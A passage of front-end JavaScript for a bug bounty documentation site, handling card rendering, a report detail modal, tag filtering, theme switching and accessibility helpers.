    elements.themeToggle.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            toggleTheme();
        }
    });
    
    // Modal functionality
    elements.modalClose.addEventListener('click', closeModal);
    elements.modalOverlay.addEventListener('click', function(e) {
        if (e.target === elements.modalOverlay) {
            closeModal();
        }
    });
    
    // Enhanced keyboard navigation
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && elements.modalOverlay.classList.contains('active')) {
            closeModal();
        }
        
        // Add keyboard shortcuts
        if (e.ctrlKey || e.metaKey) {
            switch (e.key) {
                case '/':
                    e.preventDefault();
                    elements.searchInput.focus();
                    break;
                case 'k':
                    e.preventDefault();
                    elements.searchInput.focus();
                    break;
            }
        }
    });
    
    // Footer interactions
    setupFooterInteractions();
    
    // System theme change detection
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(e) {
        if (!localStorage.getItem('cybersec-theme')) {
            const newTheme = e.matches ? 'dark' : 'light';
            setTheme(newTheme);
        }
    });
}

function setupFooterInteractions() {
    // Newsletter form
    if (elements.newsletterForm) {
        elements.newsletterForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = this.querySelector('.newsletter-input').value;
            
            if (email) {
                // Simulate newsletter subscription
                const btn = this.querySelector('.newsletter-btn');
                const originalText = btn.textContent;
                
                btn.textContent = '✅ Subscribed!';
                btn.style.background = 'var(--color-success)';
                btn.style.boxShadow = '0 0 20px var(--color-success)';
                
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '';
                    btn.style.boxShadow = '';
                    this.querySelector('.newsletter-input').value = '';
                }, 2000);
                
                announceToScreenReader('Successfully subscribed to newsletter!');
            }
        });
    }
    
    // Footer category links
    document.querySelectorAll('.footer-link[data-filter]').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const filter = this.getAttribute('data-filter');
            
            // Scroll to top and apply filter
            window.scrollTo({ top: 0, behavior: 'smooth' });
            
            setTimeout(() => {
                // Find and click the corresponding filter button
                const filterBtn = document.querySelector(`[data-filter="${filter}"]`);
                if (filterBtn) {
                    filterBtn.click();
                }
            }, 500);
        });
    });
    
    // Social links with enhanced effects
    document.querySelectorAll('.social-link').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Add click effect
            this.style.transform = 'scale(0.9)';
            this.style.boxShadow = '0 0 30px var(--glow-primary)';
            
            setTimeout(() => {
                this.style.transform = 'scale(1)';
                this.style.boxShadow = '';
            }, 200);
            
            announceToScreenReader('Social link activated!');
        });
    });
}

// ====================================================================
// ENHANCED RENDERING FUNCTIONS
// ====================================================================
function renderBugs(bugs) {
    if (bugs.length === 0) {
        elements.bugsGrid.style.display = 'none';
        elements.noResults.classList.remove('hidden');
        return;
    }
    
    elements.bugsGrid.style.display = 'grid';
    elements.noResults.classList.add('hidden');
    
    elements.bugsGrid.innerHTML = bugs.map((bug, index) => `
        <article class="bug-card glow-card" 
                role="gridcell" 
                tabindex="0" 
                onclick="openModal(${bug.id})"
                onkeydown="handleCardKeydown(event, ${bug.id})"
                aria-labelledby="bug-name-${bug.id}"
                aria-describedby="bug-desc-${bug.id}"
                style="animation-delay: ${index * 0.1}s">
            <div class="bug-card-header">
                <h3 class="bug-name" id="bug-name-${bug.id}">${escapeHtml(bug.name)}</h3>
                <span class="bounty" aria-label="Bounty amount: ${bug.bounty}">${bug.bounty}</span>
            </div>
            <div class="bug-type">${escapeHtml(bug.type)}</div>
            <div class="severity ${bug.severity.toLowerCase().replace(' ', '')}" 
                 aria-label="Severity level: ${bug.severity}">${bug.severity}</div>
            <p class="bug-description" id="bug-desc-${bug.id}">${escapeHtml(bug.description)}</p>
            <div class="bug-tags" role="list" aria-label="Tags">
                ${bug.tags.map(tag => `<span class="tag" role="listitem" onclick="filterByTag('${escapeHtml(tag)}', event)">${escapeHtml(tag)}</span>`).join('')}
            </div>
        </article>
    `).join('');
    
    // Add staggered animation
    const cards = elements.bugsGrid.querySelectorAll('.bug-card');
    cards.forEach((card, index) => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        
        setTimeout(() => {
            card.style.transition = 'all 0.5s ease';
            card.style.opacity = '1';
            card.style.transform = 'translateY(0)';
        }, index * 100);
    });
}

function filterByTag(tag, event) {
    event.stopPropagation();
    
    // Add tag click effect
    event.target.style.transform = 'scale(1.1)';
    event.target.style.boxShadow = '0 0 15px var(--glow-primary)';
    
    setTimeout(() => {
        event.target.style.transform = 'scale(1)';
        event.target.style.boxShadow = '';
    }, 200);
    
    // Apply tag as search filter
    elements.searchInput.value = tag;
    handleAdvancedSearch();
    
    announceToScreenReader(`Filtering by tag: ${tag}`);
}

// ====================================================================
// ENHANCED MODAL FUNCTIONALITY
// ====================================================================
function openModal(bugId) {
    const bug = vulnerabilities.find(b => b.id === bugId);
    if (!bug) return;
    
    elements.modalTitle.textContent = bug.name;
    
    elements.modalContent.innerHTML = `
        <div class="modal-badges">
            <span class="modal-badge bug-type">${escapeHtml(bug.type)}</span>
            <span class="modal-badge severity ${bug.severity.toLowerCase().replace(' ', '')}">${bug.severity}</span>
            <span class="modal-badge bounty">${bug.bounty}</span>
        </div>
        
        <div class="modal-section">
            <h3>🏢 Company</h3>
            <p>${escapeHtml(bug.company)}</p>
        </div>
        
        <div class="modal-section">
            <h3>📝 Description</h3>
            <p>${escapeHtml(bug.description)}</p>
        </div>
        
        <div class="modal-section">
            <h3>🧠 Lesson Learned</h3>
            <p>${escapeHtml(bug.lessonLearned)}</p>
        </div>

         <div class="modal-section">
            <h3>🧠 Methodology </h3>
            <p>${escapeHtml(bug.method)}</p>
        </div>

        
        <div class="modal-section">
            <h3>🎯 When to Use/Look For</h3>
            <p>${escapeHtml(bug.whenToUse)}</p>
        </div>
        
        <div class="modal-section">
            <h3>🏷️ Tags</h3>
            <div class="modal-tags">
                ${bug.tags.map(tag => `<span class="tag glow-hover" onclick="filterByTag('${escapeHtml(tag)}', event)">${escapeHtml(tag)}</span>`).join('')}
            </div>
        </div>
        

    `;
    
    elements.modalOverlay.classList.add('active');
    
    // Add modal entrance effect
    const modal = elements.modalOverlay.querySelector('.modal');
    modal.style.transform = 'scale(0.8) rotateY(10deg)';
    modal.style.opacity = '0';
    
    setTimeout(() => {
        modal.style.transition = 'all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
        modal.style.transform = 'scale(1) rotateY(0deg)';
        modal.style.opacity = '1';
        modal.style.boxShadow = '0 0 50px var(--glow-primary), 0 20px 40px rgba(0, 0, 0, 0.3)';
    }, 50);
    
    // Focus management
    setTimeout(() => {
        elements.modalClose.focus();
    }, 100);
    
    // Trap focus within modal
    trapFocus(elements.modalOverlay);
    
    announceToScreenReader(`Opened detailed view for ${bug.name}`);
}

function closeModal() {
    const modal = elements.modalOverlay.querySelector('.modal');
    
    // Add exit animation
    modal.style.transform = 'scale(0.8) rotateY(-10deg)';
    modal.style.opacity = '0';
    modal.style.boxShadow = '';
    
    setTimeout(() => {
        elements.modalOverlay.classList.remove('active');
        modal.style.transform = '';
        modal.style.opacity = '';
        modal.style.transition = '';
    }, 300);
    
    // Return focus
    const focusedCard = document.querySelector('.bug-card:focus');
    if (focusedCard) {
        focusedCard.focus();
    } else {
        elements.searchInput.focus();
    }
    
    announceToScreenReader('Modal closed');
}

// ====================================================================
// ACCESSIBILITY HELPER FUNCTIONS
// ====================================================================
function handleCardKeydown(event, bugId) {
    if (event.key === 'Enter' || event.key === ' ') {
        event.preventDefault();
        openModal(bugId);
    }
}

function trapFocus(element) {
    const focusableElements = element.querySelectorAll(
        'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    const firstFocusable = focusableElements[0];
    const lastFocusable = focusableElements[focusableElements.length - 1];
    
    function handleTabKey(e) {
        if (e.key === 'Tab') {
            if (e.shiftKey) {
                if (document.activeElement === firstFocusable) {
                    e.preventDefault();
                    lastFocusable.focus();
                }
            } else {
                if (document.activeElement === lastFocusable) {
                    e.preventDefault();
                    firstFocusable.focus();
                }
            }
        }
    }
    
    element.addEventListener('keydown', handleTabKey);
    element._tabHandler = handleTabKey;
}

function announceToScreenReader(message) {
    const announcement = document.createElement('div');
    announcement.setAttribute('aria-live', 'polite');
    announcement.setAttribute('aria-atomic', 'true');
    announcement.className = 'sr-only';
    announcement.textContent = message;
    
    document.body.appendChild(announcement);
    
    setTimeout(() => {
        if (document.body.contains(announcement)) {
            document.body.removeChild(announcement);
        }
    }, 1000);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ====================================================================
// UTILITY FUNCTIONS
// ====================================================================
function formatDate(dateString) {
    return new Date(dateString).toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric'
    });
}

function getSeverityColor(severity) {
    const colors = {
        'Critical': '#ff3e3e',
        'High': '#ffaa00',
        'Medium': '#0088ff',
        'Low': '#00ff88'
    };
    return colors[severity] || colors['Medium'];
}

// ====================================================================
// EXPORT FOR DEBUGGING AND EXTENSIBILITY
// ====================================================================
if (typeof window !== 'undefined') {
    window.CyberSecEliteHub = {
        vulnerabilities,
        currentBugs,
        currentTheme,
        addVulnerability: function(vuln) {
            vuln.id = Date.now();
            vulnerabilities.push(vuln);
            handleAdvancedSearch();
            console.log('✅ New vulnerability added:', vuln.name);
        },
        exportData: function() {
            return JSON.stringify(vulnerabilities, null, 2);
        },
        importData: function(jsonData) {
            try {
                const data = JSON.parse(jsonData);
                vulnerabilities = data;
                handleAdvancedSearch();
                console.log('✅ Data imported successfully');
                return true;
            } catch (e) {
                console.error('❌ Invalid JSON data:', e);
                return false;
            }
        },
        toggleSpectacularMode: function() {
            document.body.classList.toggle('spectacular-mode');
            console.log('✨ Spectacular mode toggled!');
        }
    };
}

// ====================================================================
// PERFORMANCE OPTIMIZATIONS
// ====================================================================
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

function throttle(func, limit) {
    let inThrottle;
    return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// ====================================================================
// INITIALIZATION COMPLETE
// ====================================================================
console.log(`
🚀 ========================================
   CYBERSEC BUG BOUNTY HUB - ELITE EDITION
   ========================================
   
✨ Features Loaded:
   • ${vulnerabilities.length} Elite Vulnerability Reports
   • Spectacular Glowing Effects
   • Advanced Search & Filtering
   • Professional Theme Toggle
   • Enhanced Accessibility
   • Keyboard Shortcuts (Ctrl+/ or Ctrl+K for search)
   
🎯 Ready for Elite Bug Bounty Documentation!
   
🔧 Developer Tools:
   • window.CyberSecEliteHub - API access
   • Themes: Dark/Light with transitions
   • Full keyboard navigation support
   
Made with 🩷 by lordofheaven
`);

// Add easter egg
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && e.shiftKey && e.ctrlKey) {
        console.log('🎉 ELITE MODE ACTIVATED! 🎉');
        document.body.style.filter = 'hue-rotate(45deg) saturate(1.5)';
        setTimeout(() => {
            document.body.style.filter = '';
        }, 3000);
    }
});
